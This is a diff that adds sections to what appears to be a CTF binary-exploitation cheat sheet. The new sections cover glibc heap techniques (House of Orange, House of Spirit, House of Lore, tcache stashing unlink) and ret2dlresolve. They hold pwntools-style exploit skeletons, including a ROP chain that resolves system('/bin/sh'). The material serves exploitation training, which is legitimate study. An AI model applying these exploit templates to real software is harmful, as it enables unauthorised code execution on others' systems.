@@ -18,6 +18,11 @@
 - [Tree Data Structure Stack Underallocation](#tree-data-structure-stack-underallocation)
 - [Classic Heap Unlink Attack (Crypto-Cat)](#classic-heap-unlink-attack-crypto-cat)
 - [musl libc Heap Exploitation — Meta Pointer + atexit (UNbreakable 2026)](#musl-libc-heap-exploitation-meta-pointer--atexit-unbreakable-2026)
+- [House of Orange](#house-of-orange)
+- [House of Spirit](#house-of-spirit)
+- [House of Lore](#house-of-lore)
+- [ret2dlresolve](#ret2dlresolve)
+- [tcache Stashing Unlink Attack](#tcache-stashing-unlink-attack)
 - [Kernel Exploitation](#kernel-exploitation) (basic; see [kernel.md](kernel.md) for full coverage)
 
 ---
@@ -382,6 +387,177 @@ alloc_and_write(atexit_list_addr, system_addr, "cat flag")
 **Key insight:** musl's allocator metadata (`meta` structs) is stored separately from heap data, but predictable offsets link them to the binary base. Unlike glibc, musl has no safe-linking or tcache — corrupting `meta->mem` gives direct allocation control. The `atexit` handler list is a simpler code execution target than glibc's `__free_hook` (which is removed in 2.34+).
 
 **Detection:** Binary uses musl libc (check `ldd`, or `strings binary | grep musl`). Menu-style heap challenges with read/write primitives.
+
+---
+
+## House of Orange
+
+**Pattern:** Trigger unsorted bin allocation without calling `free()`. Overwrite the top chunk size to a small value via heap overflow. Next large allocation fails the top chunk, forces `sysmalloc` to free the old top chunk into unsorted bin. Then corrupt the freed chunk for FSOP or tcache attack.
+
+```python
+# Step 1: Overflow to corrupt top chunk size
+# Top chunk must have PREV_INUSE set and size aligned to page
+# Size must be < MINSIZE away from page boundary
+edit(0, b'A' * overflow_len + p64(0xc01))  # Fake small top chunk
+
+# Step 2: Request larger than corrupted top size
+# Forces sysmalloc → old top freed into unsorted bin
+add(0x1000, b'B')  # Triggers the free
+
+# Step 3: Unsorted bin attack or FSOP from here
+# Overwrite _IO_list_all via unsorted bin's bk pointer
+```
+
+**Key insight:** House of Orange creates a free chunk without ever calling `free()` — essential when the binary has no delete/free functionality. The corrupted top chunk size must satisfy: `(size & 0xFFF) == 0` (page-aligned end), `size >= MINSIZE`, and `PREV_INUSE` bit set.
+
+**Requirements:** Heap overflow that can reach top chunk metadata. glibc < 2.26 for classic variant; modern versions need FSOP chain (House of Apple 2).
+
+---
+
+## House of Spirit
+
+**Pattern:** Forge a fake chunk in attacker-controlled memory (stack, .bss, or heap), then `free()` it to get it into a bin. Next allocation of that size returns the fake chunk, giving write access to the target area.
+
+```python
+# Forge fake fastbin chunk on the stack
+# Need valid size field and next chunk's size for validation
+fake_chunk = flat(
+    0,              # prev_size
+    0x41,           # size (0x40 + PREV_INUSE) — must match target fastbin
+    0, 0, 0, 0, 0, 0,  # data area (8 qwords for 0x40 chunk)
+    0,              # next chunk prev_size
+    0x41,           # next chunk size (passes free() validation)
+)
+
+# Write fake chunk address somewhere the binary will free()
+# e.g., overwrite a pointer that gets passed to free()
+overwrite_ptr(target_ptr, addr_of_fake_chunk + 0x10)
+
+# Trigger free(target_ptr) → fake chunk enters fastbin
+trigger_free()
+
+# Next malloc(0x38) returns our fake chunk → write to controlled area
+malloc_and_write(0x38, payload)
+```
+
+**Key insight:** The key constraint is that `free()` validates the size of the chunk AND the size of the "next" chunk (at `chunk + size`). Both must look valid — sizes in fastbin range (0x20-0x80 on 64-bit), with proper alignment and flags.
+
+---
+
+## House of Lore
+
+**Pattern:** Corrupt a smallbin chunk's `bk` pointer to point to a fake chunk in attacker-controlled memory. When the smallbin is used for allocation, the fake chunk gets linked into the bin. A second allocation returns the fake chunk, giving arbitrary write.
+
+```python
+# Step 1: Free a chunk into smallbin (via unsorted bin → sorted)
+free(chunk_a)
+malloc(large_size)  # Forces sorting: chunk_a moves to smallbin
+
+# Step 2: Forge fake chunk in target area
+# fake->fd must point back to the real smallbin chunk
+# fake->bk must point to another valid-looking chunk (or same)
+fake = flat(
+    0, 0x91,                    # prev_size, size
+    addr_of_real_chunk,         # fd → points back to legitimate chunk
+    addr_of_fake2,              # bk → another fake or self
+)
+
+# Step 3: Overwrite chunk_a->bk to point to our fake chunk
+edit_freed_chunk(chunk_a, bk=addr_of_fake)
+
+# Step 4: Two allocations from this smallbin
+alloc1 = malloc(0x80)  # Returns chunk_a (legitimate)
+alloc2 = malloc(0x80)  # Returns our fake chunk → arbitrary write!
+```
+
+**Key insight:** Requires corrupting `bk` of a freed smallbin chunk. The fake chunk's `fd` must point back to a chunk whose `bk` points to the fake — glibc checks `victim->bk->fd == victim`. On older glibc this check is weaker.
+
+---
+
+## ret2dlresolve
+
+**Pattern:** Forge `Elf64_Sym` and `Elf64_Rela` structures to trick the dynamic linker into resolving an arbitrary function (e.g., `system`) at the next PLT call. Bypasses ASLR without any libc leak.
+
+```python
+from pwn import *
+
+# pwntools has built-in ret2dlresolve support
+rop = ROP(elf)
+dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
+
+rop.read(0, dlresolve.data_addr)  # Read forged structures to known address
+rop.ret2dlresolve(dlresolve)       # Trigger resolution
+
+# Stage 1: Send ROP chain
+io.sendline(flat({offset: rop.chain()}))
+
+# Stage 2: Send forged dl-resolve payload
+io.sendline(dlresolve.payload)
+```
+
+**Manual approach (understanding the internals):**
+```python
+# Forge at a writable address (e.g., .bss)
+# 1. Fake Elf64_Rela: points PLT slot to our fake Elf64_Sym
+# 2. Fake Elf64_Sym: st_name offset points to our "system" string
+# 3. "system\x00" string
+
+SYMTAB = elf.dynamic_value_by_tag('DT_SYMTAB')
+STRTAB = elf.dynamic_value_by_tag('DT_STRTAB')
+JMPREL = elf.dynamic_value_by_tag('DT_JMPREL')
+
+# Calculate reloc_index so PLT stub pushes correct index
+reloc_index = (fake_rela_addr - JMPREL) // 0x18  # sizeof(Elf64_Rela)
+
+# Fake Elf64_Sym.st_name = offset from STRTAB to our "system" string
+fake_sym_st_name = fake_string_addr - STRTAB
+```
+
+**Key insight:** ret2dlresolve works without ANY leak. It exploits the lazy binding mechanism: when a PLT function is called for the first time, the dynamic linker looks up the symbol name and resolves it. By forging the lookup structures, you can make it resolve any libc function. Use pwntools' `Ret2dlresolvePayload` for automation.
+
+**Requirements:** Partial RELRO (Full RELRO resolves all symbols at load time, defeating this). Writable memory to place forged structures.
+
+---
+
+## tcache Stashing Unlink Attack
+
+**Pattern:** Exploit tcache's interaction with smallbin during `malloc()`. When tcache for a size is not full, `malloc()` from smallbin will "stash" remaining smallbin chunks into tcache. During stashing, the `bk` pointer is followed without full validation, allowing arbitrary address to be linked into tcache.
+
+```python
+# Setup: Need 7 chunks in tcache (to later drain) + 2 in smallbin
+# The 2nd smallbin chunk has corrupted bk → target address
+
+# Step 1: Fill tcache with 7 chunks, then free 2 more into smallbin
+for i in range(7):
+    free(tcache_chunks[i])
+# These two go to unsorted → smallbin after sorting
+free(smallbin_chunk_1)
+free(smallbin_chunk_2)
+malloc(large)  # Sort unsorted bin → chunks enter smallbin
+
+# Step 2: Drain tcache
+for i in range(7):
+    malloc(target_size)
+
+# Step 3: Corrupt smallbin_chunk_2->bk to point to (target_addr - 0x10)
+# target_addr - 0x10 because tcache stores user data pointer at chunk+0x10
+edit_after_free(smallbin_chunk_2, bk=target_addr - 0x10)
+
+# Step 4: Allocate from smallbin
+# malloc returns smallbin_chunk_1
+# Stashing mechanism follows bk chain:
+#   smallbin_chunk_2 gets stashed into tcache
+#   Then follows corrupted bk → target gets stashed into tcache too!
+malloc(target_size)
+
+# Step 5: Next two mallocs: first returns smallbin_chunk_2, second returns target
+malloc(target_size)  # Returns chunk_2
+malloc(target_size)  # Returns target_addr → arbitrary write!
+```
+
+**Key insight:** During stashing, glibc sets `bck->fd = bin` (where `bck = victim->bk`), effectively writing a main_arena pointer to `target_addr`. This is a powerful write-what-where primitive. The written value is a heap/libc address (not fully controlled), but it's enough to corrupt FILE structures, tcache metadata, or other heap state.
+
+**Requirements:** glibc 2.29+ (tcache + smallbin interaction). Ability to corrupt a freed smallbin chunk's `bk` pointer.
 
 ---
 
